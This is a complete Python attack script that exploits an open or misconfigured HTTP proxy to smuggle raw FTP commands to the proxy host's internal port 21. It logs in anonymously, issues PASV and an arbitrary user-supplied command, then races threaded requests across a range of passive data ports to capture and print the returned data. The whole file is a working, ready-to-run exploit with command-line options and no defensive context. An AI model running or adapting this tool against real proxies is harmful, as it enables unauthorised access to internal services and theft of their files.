import argparse
import socket
import ssl
import threading
import time
from urllib.parse import urlparse

context = ssl.create_default_context()


class Status:
    def __init__(self):
        self._lock = threading.Lock()
        self._success = False

    def on_success(self):
        with self._lock:
            self._success = True

    def is_success(self):
        return self._success


def try_data_ports(status: Status, is_ssl: bool, proxy_hostname: str, proxy_port: int, proxy_netloc: str, pasv_min_port: int, pasv_max_port: int) -> None:
    threads_list = []

    for pasv_data_port in range(pasv_min_port, pasv_max_port + 1):
        thread = threading.Thread(target=try_data_port, args=(status, is_ssl, proxy_hostname, proxy_port, proxy_netloc, pasv_data_port))
        threads_list.append(thread)

    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()


def try_data_port(status: Status, is_ssl: bool, proxy_hostname: str, proxy_port: int, proxy_netloc: str, pasv_data_port: int) -> None:
    with open_socket_connection(is_ssl, proxy_hostname, proxy_port) as sock:
        try:
            time.sleep(.5)  # give the command connection some time to do its part
            sock.settimeout(.5)
            msg = f"GET http://localhost:{pasv_data_port} HTTP/1.1\r\nHost: {proxy_netloc}\r\nConnection: close\r\nContent-Length: 0\r\n\r\n"
            sock.send(msg.encode())
            data = b''
            while sock:
                resp = sock.recv(4096)
                if resp:
                    status_code = resp.split(None, 2)[1]
                    if int(status_code) == 502:
                        print(f'Port was {pasv_data_port}, but got 502, unlucky')
                    if int(status_code) != 200:
                        return
                    print(f'Port is {pasv_data_port}')
                    headers, payload = resp.split(b'\r\n\r\n', 1)
                    data += payload
                    status.on_success()
                else:
                    break
            print(f'Data successfully retrieved:\n{data}')
        except Exception as e:
            print(f'Data channel could not be opened. Reason {e}')


def open_socket_connection(is_ssl: bool, proxy_hostname: str, proxy_port: int):
    sock = socket.create_connection((proxy_hostname, proxy_port))
    return context.wrap_socket(sock, server_hostname=proxy_hostname) if is_ssl else sock


def death_by_proxy(url: str, command: str, pasv_min_port: int, pasv_max_port: int, max_attempts: int) -> None:
    parsed = urlparse(url)

    content = f'''USER anonymous
PASS anonymous
PASV
{command}
QUIT
'''
    status = Status()
    proxy_hostname = parsed.hostname
    proxy_port = parsed.port
    proxy_netloc = parsed.netloc
    is_ssl = parsed.scheme == 'https'
    for i in range(0, max_attempts):
        if status.is_success():
            break
        with open_socket_connection(is_ssl, proxy_hostname, proxy_port) as sock:
            try:
                print(f'Attempt {i+1}')
                sock.settimeout(1.5)
                msg = f"GET http://localhost:21 HTTP/1.1\r\nHost: {proxy_netloc}\r\nConnection: close\r\nContent-Length: {len(content)}\r\n\r\n{content}"
                try_data_ports(status, is_ssl, proxy_hostname, proxy_port, proxy_netloc, pasv_min_port, pasv_max_port)
                sock.send(msg.encode())
                while sock:
                    resp = sock.recv(4096).decode()
                    if not resp:
                        break
            except TimeoutError:
                if i < max_attempts - 1:
                    print(f'Retrying')
                else:
                    print(f'Quitting')
            except Exception as e:
                print(f'Command could not be sent. Reason {e}')


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Proxy URL", type=str, required=True)
    parser.add_argument("-c", "--command", help="FTP command to run", type=str, required=True)
    parser.add_argument("-p", "--pasv-min-port", help="Minimum PASV port number", type=int, required=True)
    parser.add_argument("-P", "--pasv-max-port", help="Maximum PASV port number", type=int, required=True)
    parser.add_argument("-n", "--max-attempts", help="Maximum attempts", type=int, default=50)
    args = parser.parse_args()
    death_by_proxy(args.url, args.command, args.pasv_min_port, args.pasv_max_port, args.max_attempts)


if __name__ == '__main__':
    main()
